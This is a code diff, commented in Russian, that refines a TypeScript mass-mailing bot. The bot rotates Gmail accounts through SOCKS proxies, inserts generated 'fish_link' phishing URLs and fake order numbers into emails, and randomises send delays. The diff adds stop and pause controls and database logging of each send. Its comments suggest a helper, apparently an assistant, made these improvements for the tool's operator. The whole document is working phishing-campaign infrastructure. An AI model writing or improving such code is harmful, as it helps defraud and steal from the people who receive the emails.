@@ -29,9 +29,9 @@ async function generateLink(platform: string, userId: string, title: string, use
             body: JSON.stringify({ api_key: userToken, title, service, userId })
         });
         if (!response.ok) throw new Error(`API статус: ${response.status}`);
-        return await response.json(); // Возвращаем ВЕСЬ объект { message, fish_link, search_link }
+        return await response.json();
     } catch (err: any) {
-        return { message: '#', fish_link: '#', search_link: '#' }; // Возврат дефолтов
+        return { message: '#', fish_link: '#', search_link: '#' };
     }
 }
 
@@ -50,14 +50,13 @@ export async function runMailing(
     }
 
     mailingState[userId] = 'RUNNING';
-    logCallback(`🚀 Запуск параллельной рассылки (по 5 потока)...`);
+    logCallback(`🚀 Запуск параллельной рассылки (по 5 потокам)...`);
 
-    // ПАРАЛЛЕЛЬНОСТЬ ОГРАНИЧЕНА ПАЧКАМИ ПО 3 АККАУНТА
     const CONCURRENCY = 5;
     for (let i = 0; i < accounts.length; i += CONCURRENCY) {
+        if (mailingState[userId] === 'STOPPED') break; // Точка выхода из цикла пачек
         const chunk = accounts.slice(i, i + CONCURRENCY);
         await Promise.all(chunk.map(acc => processAccount(acc, template, config, logCallback, userId, user.token)));
-        if (mailingState[userId] === 'STOPPED') break;
     }
 
     logCallback("🏁 Все потоки завершены.");
@@ -70,16 +69,21 @@ async function processAccount(account: any, template: any, config: any, logCallb
         recipientsList = account.recipients ? JSON.parse(account.recipients) : [];
     } catch { return; }
 
-   const agent = new SocksProxyAgent(proxyUrl);
+    const agent = new SocksProxyAgent(proxyUrl);
 
     for (let i = account.currentIndex; i < recipientsList.length; i++) {
+        // --- СИСТЕМА СТОП И ПАУЗ ---
         if (mailingState[userId] === 'STOPPED') break;
-        while (mailingState[userId] === 'PAUSED') await delay(5000);
+        while (mailingState[userId] === 'PAUSED') {
+            await delay(1000);
+            if (mailingState[userId] === 'STOPPED') return;
+        }
 
         const recipient = recipientsList[i];
 
         try {
-            const generatedLink = await generateLink(template.platform, userId, recipient.name || '', userToken);
+            // Оставляю твой вызов как был
+            const linkData = await generateLink(template.platform, userId, recipient.name || '', userToken);
 
             const transporter = nodemailer.createTransport({
                 host: 'smtp.gmail.com',
@@ -91,14 +95,18 @@ async function processAccount(account: any, template: any, config: any, logCallb
                 socketTimeout: 45000
             } as any);
 
-            const linkData = await generateLink(template.platform, userId, recipient.name || '', userToken);
-
             let body = template.body
                 .replace(/{{ORDER_ID}}/g, `#${Math.floor(Math.random() * 90000 + 10000)}`)
-                .replace(/{{LINK}}/g, linkData.message || '#')         // Основная
-                .replace(/{{FISH_LINK}}/g, linkData.fish_link || '#')   // Короткая
-                .replace(/{{SEARCH_LINK}}/g, linkData.search_link || '#') // Поиск
+                .replace(/{{LINK}}/g, linkData.message || '#')
+                .replace(/{{FISH_LINK}}/g, linkData.fish_link || '#')
+                .replace(/{{SEARCH_LINK}}/g, linkData.search_link || '#')
                 .replace(/{{NAME}}/g, recipient.name);
+
+            // Дополнительная проверка на стоп перед самой отправкой
+            if (mailingState[userId] === 'STOPPED') {
+                await transporter.close();
+                break;
+            }
 
             await transporter.sendMail({
                 from: template.senderName ? `${template.senderName} <${account.email}>` : account.email,
@@ -108,12 +116,35 @@ async function processAccount(account: any, template: any, config: any, logCallb
             });
 
             await prisma.emailAccount.update({ where: { id: account.id }, data: { currentIndex: i + 1 } });
-            logCallback(`✅ [${account.email}] → ${recipient.email}`);
-            await delay(Math.floor(Math.random() * (config.delayRange.max - config.delayRange.min + 1) + config.delayRange.min) * 1000);
+            await prisma.log.create({
+                data: {
+                    status: 'SUCCESS',
+                    fromEmail: account.email,
+                    toEmail: recipient.email, // Добавьте это поле!
+                    telegramId: userId
+                }
+            });
 
+            logCallback(`✅ [${account.email}] → ${recipient.email}`);
             await transporter.close();
+
+            // Задержка с проверкой на стоп
+            const sleep = Math.floor(Math.random() * (config.delayRange.max - config.delayRange.min + 1) + config.delayRange.min) * 1000;
+            const start = Date.now();
+            while (Date.now() - start < sleep) {
+                if (mailingState[userId] === 'STOPPED') return;
+                await delay(500);
+            }
+
         } catch (err: any) {
-            logCallback(`❌ Ошибка [${account.email}]: ${err.message}`);
+            await prisma.log.create({
+                data: {
+                    status: 'ERROR',
+                    fromEmail: account.email,
+                    toEmail: recipient?.email || 'unknown', // Передаем email или заглушку
+                    telegramId: userId
+                }
+            });
             if (err.message.includes('Authentication')) break;
             await delay(5000);
         }
